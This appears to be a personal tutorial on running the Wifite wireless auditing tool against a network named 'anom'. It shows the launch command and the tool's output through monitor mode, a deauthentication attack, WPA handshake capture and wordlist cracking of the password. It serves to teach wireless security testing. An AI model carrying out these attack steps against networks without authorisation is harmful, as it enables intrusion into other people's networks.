# Wifite

Wifite is a really neat tool for those who want faster pawning without
the need of running command one by one. Though there are some bugs that
might happen if you didn't have dependencies for it.

Outside of Kali linux, you might want to add other programs like
`wireshark`,`hxctools`,`cowpatty`,`aircrack-ng` for this script to
run properly.

Since this is a script, you might want to use this in Kali instead
in your normal Linux daily driver. To use Wifite you have to type
` sudo ./Wifite.py`, remember to use `sudo` since you need root
privilege to run this script, it's because some dependencies want
root user privilege to change your wifi to monitor mode.

This command will execute wifite to `anom` ESSID.

```
$ sudo ./Wifite.py -e anom
```

## Results

After you run wifite, you'll get result that will be broken down here.

Banner and option are mentioned here, since I use `-e` as an option, it'll
automatically use `anom` as target ESSID.

```
   .               .    
 .´  ·  .     .  ·  `.  wifite 2.2.5
 :  :  :  (¯)  :  :  :  automated wireless auditor
 `.  ·  ` /¯\ ´  ·  .´  https://github.com/derv82/wifite2
   `     /¯¯¯\     ´    

 [+] option: targeting ESSID anom
 [!] Conflicting processes: #####
 [!] If you have problems: kill -9 PID or re-run wifite with --kill)
```

As you might see above, there might be some conflicting PID that are running
in the background, you might need to specify `--kill` to run this script
again, otherwise, you can just follow through.

After changing to monitor mode, it'll then start using deauth attack to
get wpa handshake. Manually, you might be using `airodump-ng` in conjunction
with `aireplay-ng`. It'll then save your handshake information inside
`hs/handshake_anom_MA-C0-AD-DR-ES-S0_2020-12-03T10-58-09.cap`.

```
 [+] Using wlp1s0mon already in monitor mode

 [+] Scanning. Found 0 target(s), 0 client(s). Ctrl+C when ready
 [+] found target MA:C0:AD:DR:ES:S0 (anom)

 [+] (1/1) Starting attacks against MA:C0:AD:DR:ES:S0 (anom)

 [+] anom (67db) WPA Handshake capture: Discovered new client: MA:C0:AD:DR:ES:S0
 [+] anom (0db) WPA Handshake capture: Discovered new client: MA:C0:AD:DR:ES:S0
 [+] anom (76db) WPA Handshake capture: Captured handshake
 [+] saving copy of handshake to hs/handshake_anom_MA-C0-AD-DR-ES-S0_2020-12-03T10-58-09.cap saved
```

`airodump-ng` and `aireplay-ng` are used for capturing handshake and
saving that handshake into a file, after this, it'll then start
using `tshark`, `pyrit`, `cowpatty`, `aircrack` to then check if
the handshake captured are a valid handshake.

```
 [+] analysis of captured handshake file:
 [+]   tshark: .cap file contains a valid handshake for MA:C0:AD:DR:ES:S0
 [!]    pyrit: .cap file does not contain a valid handshake
 [!] cowpatty: .cap file does not contain a valid handshake
 [!] aircrack: .cap file does not contain a valid handshake
```

After cross-checking all handshakes contained in the file, it'll start
aircrack-ng to do password cracking, it'll take some time if your
password is good enough. Here I will use a really complicated password
`abcdefgh` a really strong and complicated password (please don't use
this kind of password, since it'll be cracked in no seconds.).

```
 [+] Cracking WPA Handshake: Running aircrack-ng with wordlist-top4800-probable.txt wordlist
 [+] Cracking WPA Handshake: 95.17% ETA: 0s @ 2588.2kps (current key: scofield)
 [+] Cracked WPA Handshake PSK: abcdefgh
```

*Jokes* aside, the result then will be generated in formats below.

```
 [+]   Access Point Name: anom
 [+]  Access Point BSSID: MA:C0:AD:DR:ES:S0
 [+]          Encryption: WPA
 [+]      Handshake File: hs/handshake_anom_MA-C0-AD-DR-ES-S0_2020-12-03T10-58-09.cap
 [+]      PSK (password): abcdefgh
 [+] saved crack result to cracked.txt (2 total)
 [+] Finished attacking 1 target(s), exiting
 ```
